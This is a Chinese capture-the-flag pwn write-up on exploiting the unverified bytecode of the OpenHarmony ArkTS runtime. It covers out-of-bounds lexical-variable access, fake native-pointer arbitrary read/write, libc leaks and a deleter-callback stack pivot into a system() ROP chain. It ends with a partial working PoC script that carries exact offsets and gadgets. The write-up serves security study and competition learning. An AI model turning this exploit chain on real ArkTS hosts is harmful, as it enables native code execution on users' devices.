# babyark（2026强网杯）

## 1. 题目信息

| 项目 | 内容 |
| --- | --- |
| 分类 | PWN |
| 形态 | 混合题（附件+靶机） |
| 附件 | babyark.zip（ark_js_vm、libark_jsruntime.so、libc.so.6、ld-linux-x86-64.so.2） |
| 目标 | 容器 |

Flag：flag{动态容器已脱敏}

题面只有一句“babyark, can you exploit it?”。附件是官方`ark_js_vm`样例宿主加ArkTS动态运行时，题目要求自己构造恶意`.abc`字节码。

## 2. 题目分析

### 宿主程序

附件四个文件的作用：

- `ark_js_vm`：官方`samples/ecmascript/js_vm/main.cpp`编译出的样例宿主，未做改动；
- `libark_jsruntime.so`：ArkTS动态运行时，OpenHarmony 7.0 / API24，abc version 24.0.0.0；
- `libc.so.6`、`ld-linux-x86-64.so.2`：Ubuntu 24.04的glibc 2.39，与`ark_js_vm`一起构成运行环境。

`ark_js_vm`只接受`.abc`字节码：`main`检查最后一个参数是否以`.abc`结尾，然后调用`JSNApi::Execute(vm, file, entry)`。`entry`默认是`_GLOBAL::func_main_0`，但非merge的bundle abc会走`IsBundlePack()`分支，直接执行“第一个record”，所以用bundle方式编译时默认entry也能跑。

运行时开启了`--asm-interpreter`（计算跳转解释器），JIT默认关闭，且没有任何沙箱或seccomp。因此本题不是“写JS找引擎bug”，而是：自己构造恶意`.abc`，利用动态运行时对字节码的完全信任。

从架构上看，`ark_js_vm`只是一个很薄的宿主：解析命令行、`JSNApi::CreateJSVM`建出`EcmaVM`，再把文件交给`JSNApi::Execute`。真正的执行体在`libark_jsruntime.so`里：`EcmaVM`持有`JSThread`与`Heap`，`JSThread`上的解释器按`--asm-interpreter`选择汇编实现（`interpreter_assembly.cpp`），逐个`CodeData`取指执行。`.abc`本身是panda文件格式：文件头、索引区、record表、字面量池，以及每个函数的`CodeData`（含frame size、寄存器数与指令流）。加载时只做结构解析——定位record、解析literal、按声明的寄存器数开栈帧——既没有字节码验证器，也不做控制流或类型检查，`CodeData`里声明的寄存器数、槽位下标与指令立即数之间没有任何交叉校验。宿主也没有把执行环境降权：无seccomp、无namespace，与普通进程同权限，所以一旦在native层拿到写原语，后面就是常规的pwn。

### 漏洞：abc不做校验，ldlexvar/stlexvar越界

ArkTS认为`.abc`是随应用一起签名下发的可信输入，解释器不做任何字节码校验，寄存器下标与词法环境下标都是直接从指令立即数里读出来的：

```cpp
// ecmascript/interpreter/interpreter_assembly.cpp
level = READ_INST_8_0(); slot = READ_INST_8_1();
env = LexicalEnv::Cast(state->env ...);
SET_ACC(LexicalEnv::Cast(env)->GetProperties(thread, slot));      // ldlexvar
LexicalEnv::Cast(env)->SetProperties(thread, slot, value);        // stlexvar

// ecmascript/lexical_env.h
GetProperties(idx) -> TaggedArray::Get(idx + RESERVED_ENV_LENGTH=3)

// ecmascript/tagged_array.h
JSTaggedValue Get(thread, idx) { ASSERT(idx < GetLength()); ... return DATA_OFFSET+idx*8 }
```

`ASSERT`在release构建里被裁掉，于是实际地址是：

```text
slot_addr = env + 24(globalEnv,parentEnv,scopeInfo) + (slot+3)*8 = env + 40 + 8*slot
```

`slot`在短指令形式下是8位（`0x8a`/`0x8b`的操作数），在wide形式下（前缀`0xfd`加`0x0c`/`0x0d`）可达65535。一条指令就能以`env`为基址、向前最多约512KB做堆越界读或写，写入的值是任意ArkTS tagged value。

`level`决定从当前env沿`parentEnv`向上走几层，`slot`则在同一层内线性索引，`level=0`即当前`LexicalEnv`。短指令形式带两个uint8，wide形式把两个操作数同时拓宽到uint16，于是slot上限65535。`TaggedArray::Get`只做`DATA_OFFSET + idx*8`，`GetLength()`校验只存在于`ASSERT`里，因此越界槽位不会被拦下：读是把`env`之后第`(slot+3)`个8字节当tagged value返回，写是把累加器里的tagged value原样存进去，既不检查目标是不是本env的合法槽，也不检查目标内存里原本是什么。

越界窗口覆盖的是整片堆。ArkTS的`Heap`把young/old space按页连续映射，`LexicalEnv`、`TaggedArray`、各JS对象、`ByteArray`与`JSNativePointer`都在同一片地址空间里，所以`slot`稍大一点就能命中别的对象的字段——本题正是靠“同一次分配序列导致的固定相对位置”把`scr`、`ab`、`vic`摆进窗口。写入侧同样可观：`sta`能存对象指针、整数与double，可以把任意自造的8字节值塞进越界槽，这就是后面伪造`ArrayBufferData`的技术基础。

### LexicalEnv与相关对象布局

LexicalEnv（64位）的字段排布：

```text
+0   hclass
+8   length(uint32) | extraLength(uint32)
+16  globalEnv
+24  parentEnv
+32  scopeInfo
+40  env[0]        <-- slot 0 的落点
```

本版本的对象布局（`ECMAObject`带8字节hash，SIZE=16）：

```text
TaggedObject   : hclass@0
ECMAObject     : hash@8                         SIZE=16
JSObject       : properties@16, elements@24     SIZE=32
JSArray        : length@32(uint32), traceIndex@36, trackInfo@40
JSArrayBuffer  : data@32, byteLength@40, bits@44
JSTypedArray   : viewedBuffer@32, byteLength@40, byteOffset@44, arrayLength@48, type@52
ByteArray      : arrayLength@8, byteLength@12, data@16（数据内联）
TaggedArray    : length@8, extraLength@12, data@16（数据内联）
JSNativePointer: externalPointer@8, deleter@16, data@24, bindingSize@32, flag@36
```

从这张表可以直接看出：`Uint8Array`的`viewedBuffer`在`+32`，它指向的`ByteArray`的数据在自身`+16`处内联；`ArrayBuffer`的`data`在`+32`，正常情况下指向一个`JSNativePointer`，该指针的`externalPointer`在`+8`、`deleter`在`+16`、`data`在`+24`。

这张表里有三个细节值得展开。其一是tagged value：所有字段都是8字节，对象指针、Smi整数与double共用同一格，靠低位tag位区分类型，因此“把一个对象的指针写进某个字段”和“把某个字段读出来当对象用”在解释器看来完全合法，没有额外元数据参与判断。其二是`ByteArray`的内联数据：它的数据不是指针，而是从对象自身`+16`开始，长度字段就在前面，所以一个`ByteArray`对象其实是一段能自写自读的8字节槽阵列，天然可以充当伪造对象的工作区；又因为小数组走堆内分配、且被闭包和全局变量同时引用，它的地址在GC时不会移动。其三是`JSTypedArray`与`ArrayBuffer`的解耦：`u8.viewedBuffer`保存的是`ab`对象指针，`u8`每次访问元素时才去`ab`里取`data`，再经`JSNativePointer`取`externalPointer`。这意味着篡改`ab.data`不影响`u8`对`ab`的引用，`u8`会继续用被污染的`ab`，这正是把它变成读写器的入口，也解释了为什么之后不能再回头动`ab.data`。另外`byteLength`只在构造与边界检查时使用，typed array快速路径上的地址计算完全依赖`externalPointer`，长度字段拦不住已经伪造的指针。

## 3. 解题过程

### 用es2abc编译出模板abc

用OpenHarmony 7.0 SDK自带的`es2abc`编译一段JS模板，得到abc version 24.0.0.0的字节码。模板的关键是`outer()`：

- 让`outer()`里存在被闭包捕获的局部变量`secret`，编译器就会为它生成`LexicalEnv`（一条`newlexenv`），后面所有`ldlexvar`/`stlexvar`都以这个env为基址；
- 依次分配`scr = new Uint8Array(0x200)`（小数组走堆内`ByteArray`，数据内联，正好当scratch用）、`ab = new ArrayBuffer(0x100)`（之后被伪造`data`的对象）、`u8 = new Uint8Array(ab)`（之后变成任意地址读写器）、`vic = new ArrayBuffer(0x100)`（析构回调的victim）；
- 定义4个“探针”闭包`p0`/`p1`/`p2`/`p3`，它们都引用`outer`的局部变量，因此共享同一个env，后面会被整段替换成越界读写指令。

编译时不加`--merge-abc`，输出bundle abc，运行时默认entry即`IsBundlePack()`分支的第一个record。注意`es2abc`的record名等于输出文件名（不是源文件名），bundle形式下record名不影响执行。

模板里的探针原本都是`return secret;`这类无副作用的函数，`p3`带一个参数并做了几次加法，目的是让编译器为它分配参数寄存器`v4`（第一个实参），补丁后才能用`lda v4`取到任意传入的JS值。

### 定位堆布局

在ArkTS里，闭包捕获的变量按声明顺序进入env的slot。实测该模板的布局稳定（多次运行一致）：

| env slot | 内容 |
| --- | --- |
| 5 | `scr`的`ByteArray`对象（即`scr.viewedBuffer`） |
| 14 | `scr`的`ByteArray`数据起点，也就是公式`env+40+8*14`算出的地址 |
| 82 | `ab`的`ArrayBufferData`字段（`ab`对象`+32`） |
| 92 | `ab`对象本身的指针（即`u8.viewedBuffer`） |

这些slot就是越界原语的三个“抓手”：slot 5给出scratch对象地址，slot 14是scratch数据区（可当16字节的伪造对象空间），slot 82是`ab.data`字段，slot 92是`ab`对象。slot 14之所以能当地址用，是因为`8*14 = 112`，`env+40+112`正好落在`scr`内联数据里；把这里当作标签值写回slot 14，读到它的地方就会把它当成一个指向该地址的tagged指针。

### 打字节码补丁：把探针换成原语

`es2abc`输出的abc里，每个函数的指令流在`CodeData`项中连续存放。补丁做法是用特征串定位探针函数体，然后整段覆盖成需要的指令。用到的指令编码为：

```text
ldlexvar imm8,imm8 = 8a <level> <slot>
stlexvar imm8,imm8 = 8b <level> <slot>
lda v8             = 60 <v>
sta v8             = 61 <v>
return             = 64
```

`level`固定为0（当前词法环境层）。四个探针替换成：

```text
p0: ldlexvar 0,5  ; stlexvar 0,14 ; return   -> 把scr的ByteArray指针写进scr数据[0..7]
p1: ldlexvar 0,14 ; stlexvar 0,82 ; return   -> 把scratch里的值写进ab.data
p2: ldlexvar 0,92 ; stlexvar 0,14 ; return   -> addrof(ab)
p3: lda v4        ; stlexvar 0,14 ; return   -> addrof(任意传入的JS值)
```

三个原语的分工很清晰：`p0()`负责“读出scr的真实地址”，`p1()`负责“把scratch里伪造好的值写进`ab.data`”，`p2`/`p3`负责“把任意对象的tagged指针取出来放进scratch”。`ldlexvar 0,14`读的正是scratch数据区，因此“读scratch内容”等价于“把其中的8字节当tagged值使用”。

定位方式：前三个探针的函数体都以`ldlexvar 0,0 ; sta v0`（字节`3c 00 61 00`）开头，按出现顺序取前三个命中位置即`p0`/`p1`/`p2`；`p3`用`ldai 1 / sta v0 / ldai 2`（字节`62 01 00 00 00 61 00 62 02`）定位。补丁长度与原指令序列对齐，覆盖后不影响其它函数的偏移。

### 伪造JSNativePointer，得到任意地址读写

typed array的每次元素访问都会走：

```text
JSNativePointer::Cast(ab->data)->GetExternalPointer() + index
```

`ab->data`本来指向运行时分配的`JSNativePointer`，其`externalPointer`就是缓冲区地址。如果把这个`data`字段改成一个**受控制的假NP**，那么`u8[i]`就会读写“假NP的`externalPointer` + i”。

假NP放在scratch数据区：`D = B + 16`，其中`B`是`p0()`取回的`ByteArray`地址，`+16`正是其内联数据起点。运行时在release构建下不再校验hclass，所以假NP只需要在`+8`处放目标地址：

```text
D+0  : 任意（hclass，release不校验）
D+8  : externalPointer = 目标地址
```

具体动作：

1. `p0()`→`rd(0)`得到`B`，`D = B + 16`；
2. `p3(ab)`→`Aab`，`p3(vic)`→`Avic`，拿到两个对象的tagged指针；
3. `wr(0,D); wr(8,Aab); p1()`：scratch里写入假NP（地址`D`、externalPointer=`Aab`），再由`p1()`把`ab.data`写成指向`D`的tagged指针。此后`u8`的窗口就落在`ab`对象本身的起始处；
4. 要改读写目标，只需改写scratch`+8`（即假NP的`externalPointer`）再继续用`u8`，**不能再直接改`ab.data`**，因为`u8`自己的数据指针就取自那里。

于是`u8`成了8字节粒度的任意地址读写器，`rd/wr`操作scratch、`rdu/wru`操作目标内存。

这里有两个容易踩空的细节。第一，窗口地址要经`ab.data`解引用两层：先`Cast`成`JSNativePointer`，再取`+8`的`externalPointer`，所以假NP必须是一块真实可读的内存，且`+8`处放目标地址；`D`落在`scr`内联数据里，既是可写内存，又因为`scr`被JS侧持有而不会被GC搬走。第二，粒度是8字节而不是字节：`u8[i]`的地址是`externalPointer + i`，单次读写只有uint8，但所有关键字段（`data`、`viewedBuffer`、`externalPointer`、`deleter`）都8字节对齐，用八次`u8[]`拼一个64位数即可，不必追求真正的任意字节写。假NP的其余字段保持原样也不影响：`deleter`只在`Destroy()`时被调用，`bindingSize`与`flag`在这条路径上不被读取，`+0`的hclass在release构建里同样不校验，于是“伪造”退化为一件事——把目标地址放进`+8`。

### 泄漏libark与libc

- `wr(8, Avic)`把窗口移到`vic`对象起点，`rdu(32)`读出`vic+32`，即`vic`的`JSNativePointer`地址`vicNP`；
- `wr(8, vicNP)`把窗口移到该NP，`rdu(8)`得`externalPointer`（`vic`的native缓冲，一块不会移动的malloc内存，后面当ROP载体），`rdu(16)`得`deleter`；
- 这个`deleter`是`NativeAreaAllocator::FreeBufferFunc`，在`libark_jsruntime.so`里偏移0x2504b40，相减得libark基址；
- 读libark的GOT：`.got.plt`中`execv`槽在0x2acbbf8，由于`BIND_NOW`已全部解析，这里存的是真实地址；减去libc 2.39的`execv`偏移0xef010得libc基址。脚本用`libc % 0x1000 == 0`校验，若不成立则退回读`free`槽（0x2ac07f8）减`free`偏移0xade30。

GOT位于`GNU_RELRO`段内，只读，因此只能读不能写——控制流不能走GOT覆盖，必须另找可写函数指针。

### 用JSNativePointer析构回调做栈迁移

不碰栈也能拿shell，靠的是`JSNativePointer`的析构回调链：

- 程序正常结束→`main`里`JSNApi::DestroyJSVM`→`~EcmaVM`→`heap_->ClearNativePointerList()`；
- 该函数对native pointer列表里的每个`JSNativePointer`调用`Destroy()`，最终执行`deleter(env, externalPointer, data)`，第三个参数`data`落在`rdx`。

利用步骤：

1. 把`vic`的native缓冲（`CB = vicExt`）当ROP载体：`wr(8, CB)`把`u8`窗口移过去，在`CB+0x40`写入命令串`cat /flag* /home/*/flag* /root/flag* 2>/dev/null;find / -maxdepth 5 -iname 'flag*' -type f -exec cat {} + 2>/dev/null|head -c 3000`并以0结尾；
2. 在`CB+0`布置`pop rdi; ret`、命令串地址、`ret`、`system`，并按`(data+32)%16==8`判断是否需要多垫一个`ret`，保证进入`system`时栈16字节对齐；
3. `wr(8, vicNP)`把窗口移回NP，然后`wru(8, CB)`（`externalPointer`，本路径下无实际作用）、`wru(16, libc+0x5ef6f)`（`deleter`改成`mov rsp, rdx ; ret`）、`wru(24, data)`（`data`指向ROP链）；
4. payload末尾条件调用`test_end()`，兼容带该断言钩子的宿主；
5. VM析构时`rdx = data = CB`，`mov rsp,rdx;ret`完成栈迁移，ROP直接调`system()`打印flag。

把这条链放进“逃逸”的语境里看会更清楚：ArkTS给应用的隔离只有两层——静态类型与被签名下发的abc。运行时并不提供进程级沙箱，所以这里的逃逸是逃出VM的类型与内存安全边界：从只能操作tagged value的脚本，变成能读写任意native地址、进而摆布寄存器和栈的本地代码执行。控制流的选择也受此约束：GOT位于`GNU_RELRO`内只读，丢掉GOT覆盖这条路之后，可写函数指针只剩堆上的对象字段，而`JSNativePointer`的`deleter`恰好是一个由运行时在析构时无条件调用、参数为`(env, externalPointer, data)`的回调，作用等价于旧glibc的`__free_hook`。第三个参数走`rdx`，把`deleter`换成`mov rsp, rdx; ret`就完成栈迁移，ROP链再用`pop rdi; ret`传参。选`system`是为了省事；如果目标只允许`execve`，同一套链把末尾换成`execve(path, argv, 0)`即可——两者本质一致，都是借一个受控的native调用点把参数寄存器摆好再跳过去。payload末尾不抛异常是硬性要求：一旦异常提前展开，析构链走不到`ClearNativePointerList()`，`deleter`也就不会被触发。

### 偏移与常量汇总

| 名称 | 值 | 说明 |
| --- | --- | --- |
| env越界公式 | `env+40+8*slot` | wide形式slot可达65535，窗口约512KB |
| slot 5 / 14 / 82 / 92 | scr ByteArray / scr数据/ `ab.data` / `ab` | 模板堆布局 |
| `ldlexvar` | `8a <level> <slot>` | level固定0 |
| `stlexvar` | `8b <level> <slot>` | level固定0 |
| `lda v8` / `sta v8` / `return` | `60 <v>` / `61 <v>` / `64` | 补丁用到的其余指令 |
| `FreeBufferFunc` | libark+0x2504b40 | libark基址 |
| `execv@got` | libark+0x2acbbf8 | libc基址 |
| `free@got` | libark+0x2ac07f8 | 备用校验路径 |
| `system` | libc+0x58750 | 执行命令 |
| `execv` / `free` | libc+0xef010 / libc+0xade30 | 反推libc |
| `pop rdi; ret` | libc+0x10c08d | 传参 |
| `ret` | libc+0x28a92 | 栈对齐 |
| `mov rsp, rdx; ret` | libc+0x5ef6f | 栈迁移 |

表中偏移的推导方式是一致的：`deleter`给出`FreeBufferFunc`（运行时对该回调的唯一赋值点），两个GOT槽给出libc入口，其余是libc 2.39内的符号与gadget偏移。稳定性上分两类——env越界公式与slot 5/14/82/92只依赖模板源码的声明顺序和一次分配序列，换编译器版本或增删局部变量都要重测；libark与libc侧偏移只依赖附件二进制，远程同版本可直接复用。wide形式slot上限65535对应约512KB窗口，足够覆盖同一堆区里刚分配的所有对象，这也是“不改模板、只调slot”仍能命中目标的余量。

## 4. PoC

```python
#!/usr/bin/env python3
import os, socket, subprocess, sys

HERE = os.path.dirname(os.path.abspath(__file__))
ES2ABC = os.path.expanduser(
    "~/sdk/ohos-sdk/linux/ets/ets/build-tools/ets-loader/bin/ark/build/bin/es2abc")

JS_SRC = r'''
var G_SCR, G_AB, G_U8, G_VIC;
function outer() {
  let secret = 111;                       // 被闭包捕获，强制生成 LexicalEnv
  let scr = new Uint8Array(0x200);        // 堆内 ByteArray，数据内联（scratch）
  let ab  = new ArrayBuffer(0x100);       // 被伪造 data 的对象
  let u8  = new Uint8Array(ab);           // 之后变成任意地址读写器
  let vic = new ArrayBuffer(0x100);       // 析构回调的 victim
  G_SCR = scr; G_AB = ab; G_U8 = u8; G_VIC = vic;
  let p0 = function p0(){ return secret; };
  let p1 = function p1(){ return secret; };
  let p2 = function p2(){ return secret; };
  let p3 = function p3(x){ let t = 1; t = t + 2; t = t + 3; return x; };
  return [p0, p1, p2, p3];
}
let ps = outer(), p0 = ps[0], p1 = ps[1], p2 = ps[2], p3 = ps[3];
let scr = G_SCR, ab = G_AB, u8 = G_U8, vic = G_VIC;
function rd(o){let v=0,m=1;for(let i=0;i<8;i++){v=v+scr[o+i]*m;m=m*256;}return v;}
function wr(o,v){let m=1;for(let i=0;i<8;i++){scr[o+i]=Math.floor(v/m)%256;m=m*256;}}
function rdu(o){let v=0,m=1;for(let i=0;i<8;i++){v=v+u8[o+i]*m;m=m*256;}return v;}
function wru(o,v){let m=1;for(let i=0;i<8;i++){u8[o+i]=Math.floor(v/m)%256;m=m*256;}}

p0(); let B = rd(0); let D = B + 16;              // scr 的 ByteArray / 伪造 NP 的地址
p3(ab); let Aab = rd(0); p3(vic); let Avic = rd(0);
wr(0, D); wr(8, Aab); p1();                       // ab.data = fakeNP(D)，externalPointer = Aab
wr(8, Avic); let vicNP = rdu(32);                 // vic 的 JSNativePointer
wr(8, vicNP); let vicExt = rdu(8), vicDel = rdu(16);
let libark = vicDel - 0x2504b40;                  // FreeBufferFunc
wr(8, libark + 0x2acbbf8); let execvG = rdu(0);   // execv@got
let libc = execvG - 0xef010;
if (libc % 0x1000 != 0) { wr(8, libark + 0x2ac07f8); libc = rdu(0) - 0xade30; }
/* 在 vic 的 native 缓冲里布置 ROP：system("cat /flag* ...") */
let CB = vicExt, chainOff = 0x00, cmdOff = 0x40;
wr(8, CB);
let cmdStr = "cat /flag* /home/*/flag* /root/flag* 2>/dev/null;" +
             "find / -maxdepth 5 -iname 'flag*' -type f -exec cat {} + 2>/dev/null|head -c 3000";
let cmd = [];
for (let i = 0; i < cmdStr.length; i++) cmd.push(cmdStr.charCodeAt(i) & 0xff);
```
